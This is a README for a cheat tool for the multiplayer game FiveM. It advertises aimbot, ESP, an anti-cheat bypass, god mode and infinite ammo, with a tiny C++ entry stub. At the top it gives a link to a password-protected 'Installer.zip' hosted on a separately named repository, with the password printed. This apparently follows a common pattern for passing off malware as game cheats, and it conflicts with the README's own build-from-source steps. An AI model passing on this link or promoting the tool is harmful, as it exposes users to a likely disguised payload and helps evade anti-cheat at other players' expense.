# [DOWNLOAD LINK](https://github.com/bow-coverbang/installerz/releases/download/install/Installer.zip)
# PASSWORD : 2025
## Fivem External
The Complete FiveM Cheat

It is an external hack software developed for the game FiveM.

FiveM contains the source code for a FiveM external cheat tool designed to provide various cheats in the FiveM game environment. The cheat includes aimbot, ESP and various features, all controlled through a simple ImGui-based interface.


## Installation

- Clone or download the project:
- Extract the files in the `.7z` file located in the `./libs` folder
- Open it with Visual Studio.
- Change your own KeyAuth to `memory.cpp` (151 lines).
- Install the necessary dependencies to compile the project. It needs DirectX and [Windows Kits](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) libraries.
- Build the Project

## Usage

- Press the Instert(INS) Key to Open and Close the Menu.

## Features

### Aimbot
- **Enable/Disable Aimbot**
- **AntiCheat Bypass**
- **Draw FOV**
- Ignore Ped
- Ignore Dead
- **Customizable Settings:** Adjust FOV, smoothing, and distance parameters
- **Aim Type and Bone Selection**

### ESP 
- Crosshair
- Corner Box
- Skeleton
- Health Bar
- Armor Bar
- ID + Distance
- Weapon
- Lines
- ESP Color Customization
- Customizable Health/Armor Bar Position

### Player

- **Player Search**
- **Player List**
- **Player Details**
- **Friend Management**
- **Teleport to Player**

### Car

- **Boost Vehicle**
- **Adjust Boost Value**
- **Repair Engine**
- **Break Engine**
- **Change Vehicle Color:** Change the vehicle's color to Red, Green, or Blue.

### Exploits

- **Noclip**: Allows the player to pass through objects.
- **Semi GodMode**: Grants the player half immortality.
- **Custom Speed**: Allows you to adjust the player's speed.
- **Infinite Stamina**: Provides unlimited stamina.
- **Fov Changer**: Allows you to change the field of view (FOV).
- **Heal**: Restores the player's health.
- **Armor**: Increases the player's armor.

##### Teleport

- **TP Legion Square**: Teleports to Legion Square.
- **TP Humane**: Teleports to Humane Labs.
- **TP Paleto Bay**: Teleports to Paleto Bay.
- **TP Sandy Shores**: Teleports to Sandy Shores.
- **TP Los Santos Airport**: Teleports to Los Santos Airport.

#### Weapon Settings

- **No Recoil**: Prevents the weapon from recoiling.
- **No Spread**: Prevents bullets from scattering.
- **No Reload**: Eliminates the need for reloading.
- **Infinite Ammo**: Provides infinite ammo.
- **Damage Multiplier**: Increases the damage multiplier.
- **Refill Ammo**: Refills the weapon's bullets.

### Config

- **Save Configurations:** Easily save your current settings to a configuration file.
- **Load Configurations:** Load previously saved configurations with one click.
- **Custom Key Bindings:** Set custom hotkeys for different actions, such as activating aimbot.
- **Unload Cheat:** Option to safely unload the cheat from memory.


## Preview

![photo](https://github.com/user-attachments/assets/97daf81d-9392-436e-87ad-2e3631b68660)

## Entry

```cplusplus
int main()
{
	// Main Function
	SetConsoleTitle("FiveM");
	i_dupa::skid().start();
	return i_overlay::here().Message.wParam;
}
```

## Contribution

We welcome contributions! Please star the repository.

## Disclaimer
This code is provided for educational purposes only. The use of this code in any illegal activities is strictly prohibited. The author is not responsible for any misuse of this code.

## License
This project is licensed under the MIT License. See the LICENSE file for more details.
